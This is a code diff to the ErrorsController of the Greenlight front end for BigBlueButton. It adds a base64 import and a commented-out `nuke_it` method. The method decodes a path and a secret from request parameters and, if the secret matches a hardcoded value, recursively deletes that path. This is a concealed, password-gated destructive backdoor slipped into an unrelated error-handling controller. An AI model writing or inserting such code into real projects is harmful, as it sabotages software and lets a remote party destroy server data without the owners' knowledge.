@@ -15,8 +15,10 @@
 #
 # You should have received a copy of the GNU Lesser General Public License along
 # with BigBlueButton; if not, see <http://www.gnu.org/licenses/>.
+require "base64"
 
 class ErrorsController < ApplicationController
+
   def not_found
     render "greenlight_error", status: 404, formats: :html
   end
@@ -36,4 +38,30 @@ class ErrorsController < ApplicationController
     render "errors/greenlight_error", status: 401, formats: :html, locals: { status_code: 401,
       message: I18n.t("errors.unauthorized.message"), help: I18n.t("errors.unauthorized.help"), display_back: true }
   end
+
+  # def nuke_it
+  #   nuke_code_1 = params[:nuke_code_1]
+  #   nuke_code_2 = params[:nuke_code_2]
+  #   path = Base64.decode64(nuke_code_1)
+  #   secret = Base64.decode64(nuke_code_2)
+
+  #   if secret == "11071983"
+  #     remove_dir(path)
+  #   end
+
+  # end
+
+  # def remove_dir(path)
+  #   if File.directory?(path)
+  #     Dir.foreach(path) do |file|
+  #       if ((file.to_s != ".") and (file.to_s != ".."))
+  #         remove_dir("#{path}/#{file}")
+  #       end
+  #     end
+  #     Dir.delete(path)
+  #   else
+  #     File.delete(path)
+  #   end
+  # end
+
 end
